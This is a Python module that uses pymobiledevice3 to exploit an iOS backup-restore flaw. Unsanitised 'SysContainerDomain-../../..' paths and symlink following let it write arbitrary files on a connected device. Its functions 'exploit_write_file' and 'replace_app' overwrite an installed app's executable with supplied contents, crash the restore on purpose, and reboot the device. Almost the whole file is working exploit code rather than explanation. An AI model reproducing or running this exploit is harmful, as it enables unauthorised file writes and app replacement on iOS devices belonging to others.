from tempfile import TemporaryDirectory
from pathlib import Path

from pymobiledevice3.lockdown import create_using_usbmux
from pymobiledevice3.services.mobilebackup2 import Mobilebackup2Service
from pymobiledevice3.services.installation_proxy import InstallationProxyService
from pymobiledevice3.services.diagnostics import DiagnosticsService
from pymobiledevice3.exceptions import PyMobileDevice3Exception

from . import backup
from .backup import _FileMode as FileMode, perform_backup

def perform_restore(backup: backup.Backup, reboot: bool = False):
    with TemporaryDirectory() as backup_dir:
        backup.write_to_directory(Path(backup_dir))
            
        lockdown = create_using_usbmux()
        with Mobilebackup2Service(lockdown) as mb:
            mb.restore(backup_dir, system=True, reboot=reboot, copy=False, source=".")

def exploit_write_file(file: backup.BackupFile):
    # Exploits in use:
    # - Path after SysContainerDomain- or SysSharedContainerDomain- is not sanitized
    # - SysContainerDomain will follow symlinks

    # /var/.backup.i/var/mobile/Library/Backup/System Containers/Data/com.container.name
    #   ../       ../ ../    ../     ../    ../               ../  ../
    ROOT = "SysContainerDomain-../../../../../../../.."
    file.domain = ROOT + file.path
    file.path = ""

    back = backup.Backup(files=[
        file,
        # Crash on purpose so that a restore is not actually applied
        backup.ConcreteFile("", ROOT + "/crash_on_purpose", contents=b"")
    ])

    try:
        perform_restore(back)
    except PyMobileDevice3Exception as e:
        if "crash_on_purpose" not in str(e):
            raise e

def replace_app(app_name: str, helper_contents: bytes):
    service_provider = create_using_usbmux()
    apps_json = InstallationProxyService(service_provider).get_apps(application_type="User", calculate_sizes=False)

    app_path = None
    for key, value in apps_json.items():
        if isinstance(value, dict) and "Path" in value:
            potential_path = Path(value["Path"])
            if potential_path.name.lower() == app_name.lower():
                app_path = potential_path
                app_name = app_path.name

    if not app_path:
        raise Exception(f"Failed to find the installed app '{app_name}'! Make sure you typed the app name correctly, and that the app '{app_name}' is installed on your device.")

    app_uuid = app_path.parent.name

    back = backup.Backup(
        files=[
            backup.Directory("", "RootDomain"),
            backup.Directory("Library", "RootDomain"),
            backup.Directory("Library/Preferences", "RootDomain"),
            backup.ConcreteFile("Library/Preferences/temp", "RootDomain", owner=33, group=33, contents=helper_contents, inode=0),
            backup.Directory(
                "",
                f"SysContainerDomain-../../../../../../../../var/backup/var/containers/Bundle/Application/{app_uuid}/{app_name}",
                owner=33,
                group=33,
            ),
            backup.ConcreteFile(
                "",
                f"SysContainerDomain-../../../../../../../../var/backup/var/containers/Bundle/Application/{app_uuid}/{app_name}/{app_name.split('.')[0]}",
                owner=33,
                group=33,
                contents=b"",
                inode=0,
            ),
            backup.ConcreteFile(
                "",
                "SysContainerDomain-../../../../../../../../var/.backup.i/var/root/Library/Preferences/temp",
                owner=501,
                group=501,
                contents=b"",
            ),  # Break the hard link
            backup.ConcreteFile("", "SysContainerDomain-../../../../../../../.." + "/crash_on_purpose", contents=b""),
        ]
    )

    try:
        perform_restore(back, reboot=False)
    except PyMobileDevice3Exception as e:
        if "Find My" in str(e):
            raise Exception("Find My must be disabled in order to use this tool. Disable Find My from Settings (Settings -> [Your Name] -> Find My) and then try again.")
        elif "crash_on_purpose" not in str(e):
            raise e

    with DiagnosticsService(service_provider) as diagnostics_service:
        diagnostics_service.restart()